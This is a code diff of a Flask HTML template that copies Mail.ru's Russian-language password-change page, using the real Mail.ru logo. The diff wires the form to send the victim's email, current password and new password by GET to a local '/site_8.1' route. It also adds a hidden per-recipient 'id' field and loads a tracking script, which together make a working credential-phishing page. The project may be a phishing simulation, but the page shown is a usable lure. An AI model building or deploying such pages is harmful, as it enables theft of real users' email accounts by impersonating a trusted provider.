@@ -4,29 +4,32 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Mail.ru — Смена пароля</title>
-  <link rel="stylesheet" href="D:\April\tracking_project\static\css\style_8.1.css" />
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style_8.1.css') }}">
+
 </head>
 <body>
   <div class="container">
     <div class="form-box">
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Mail.Ru_logo.svg/1200px-Mail.Ru_logo.svg.png" alt="Mail.ru logo" class="logo"/>
       <h2>Смена пароля</h2>
-      <form>
+      <form action="/site_8.1" method="get">
+        <input type="hidden" name="id" value="{{ request.args.get('id') }}">
         <label for="email">Почта</label>
-        <input type="email" id="email" name="email" placeholder="your@mail.ru" required/>
+        <input class="почта" type="email" id="email" name="email" placeholder="your@mail.ru" required/>
 
         <label for="old-password">Текущий пароль</label>
-        <input type="password" id="old-password" name="old-password" placeholder="Введите текущий пароль" required/>
+        <input class="пароль" type="password" id="old-password" name="old-password" placeholder="Введите текущий пароль" required/>
 
         <label for="new-password">Новый пароль</label>
-        <input type="password" id="new-password" name="new-password" placeholder="Введите новый пароль" required/>
+        <input class="новый пароль" type="password" id="new-password" name="new-password" placeholder="Введите новый пароль" required/>
 
         <label for="confirm-password">Повторите новый пароль</label>
-        <input type="password" id="confirm-password" name="confirm-password" placeholder="Повторите новый пароль" required/>
+        <input class="повторение нового пароля" type="password" id="confirm-password" name="confirm-password" placeholder="Повторите новый пароль" required/>
 
         <button type="submit">Сменить пароль</button>
       </form>
     </div>
   </div>
+  <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
 </body>
 </html>
